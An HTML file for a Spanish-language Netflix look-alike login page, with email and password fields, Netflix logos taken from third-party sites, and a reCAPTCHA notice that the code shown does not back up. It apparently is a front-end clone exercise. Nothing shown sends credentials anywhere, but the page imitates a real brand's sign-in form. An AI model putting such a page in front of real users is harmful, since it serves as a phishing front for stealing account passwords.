<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/jpg" href="https://brandemia.org/sites/default/files/sites/default/files/icono_netflix_nuevo.jpg">
</head>

<body>
    <img class="logo" src="https://1000marcas.net/wp-content/uploads/2020/01/Logo-Netflix.png" alt="Logo-Netflix">
    <form action="" method="post" id="form">
        <div class="form-login">
            <h2>Inicia sesión</h2>

            <input class="input-group" type="email" name="user" id="email" placeholder="Email">
            <input class="input-group" type="password" name="password" id="password" placeholder="Contraseña">

            <button type="submit" class="button">
                Iniciar sesión
            </button>
            <div class="help">
                <div class="check">
                    <input type="checkbox" name="recordar" value="" checked>
                    <label for="recordar">Recuérdame</label>
                </div>
                <div class="need">
                    <a href="#">¿Necesitas ayuda?</a>
                </div>
            </div>
            <div class="sub">
                ¿Primera vez en Netflix? <a href="https://www.netflix.com/co/">Suscríbete ahora</a>
            </div>
            <div class="info">
                Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a> 
            </div> 
            <p class="warnings" id="warnings"></p>    
        </div>
    </form>
    
    <script src="app.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>

</body>

</html>
